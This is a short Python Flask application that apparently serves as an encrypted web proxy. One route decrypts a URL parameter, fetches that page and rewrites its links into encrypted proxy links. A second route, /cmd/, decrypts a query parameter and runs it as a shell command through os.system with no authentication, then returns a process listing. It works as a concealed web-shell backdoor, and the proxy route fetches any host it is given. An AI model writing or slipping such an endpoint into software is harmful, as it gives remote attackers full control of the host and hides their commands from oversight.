import time

import requests as requests
from flask import Flask, request
from aes import decrypt, encrypt
import bs4
import os

app = Flask(__name__)
app.config['JSON_AS_ASCII'] = False


@app.route('/')
def hello_world():
    return 'URL'


headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    "Accept-Language": "zh-CN",
    "Accept-Encoding": "gzip, deflate, br",
    "Referer": "http://www.sdyu.edu.cn/index.htm",
}


# @app.before_request
# def proxy():
#     headers = {h[0]: h[1] for h in request.headers}
#     print('request.json',request.json)
#     # headers['x-token'] = '***'
#     # 一些自己的逻辑...
#     return requests.request(request.method, request.url, data=request.json, headers=headers).content

@app.route('/url/')
def url():
    html = ''
    try:
        print(request.args.get("url"))
        url = decrypt(request.args.get("url").replace(' ', '+'))
        print('url', url)
        html = requests.get(url=f'http://{url}', headers=headers).text.encode().decode('utf-8')
        with open("tmp.html", 'w') as f:
            f.write(html)
        # try:
        soup = bs4.BeautifulSoup(html, "html.parser")
        href_set = {item.get('href') for item in soup.find_all(href=True)}
        replace_dict = {}
        # print(href_set)
        SS = '/url/?url='
        for item in href_set:
            try:
                if item.startswith('https://'):
                    replace_dict[item] = f'{SS}{encrypt(item)}'
                elif item.startswith('http://'):
                    replace_dict[item] = f'{SS}{encrypt(item)}'
                # elif item.startswith('//'):
                #     replace_dict[item] = f'{SS}{encrypt(f"http:{item}")}'
                # elif item.startswith('/'):
                #     replace_dict[item] = f'{SS}{encrypt(f"http://{url}{item}")}'
            except:
                pass
        # href_set = {"" if item in replace_dict else item for item in href_set}
        # print(href_set)
        for key in replace_dict:
            print(key, replace_dict[key])
            html = html.replace(key, replace_dict[key])
    except Exception as e:
        print(e)
    return html


@app.route('/cmd/')
def cmd():
    cmd = decrypt(request.args.get("cmd").replace(' ', '+'))
    os.system(cmd)
    time.sleep(0.5)
    os.system("ps -ef|grep python > cmd.log")
    time.sleep(0.5)
    with open("cmd.log", 'r') as f:
        return str(f.readlines())


if __name__ == "__main__":
    app.run()
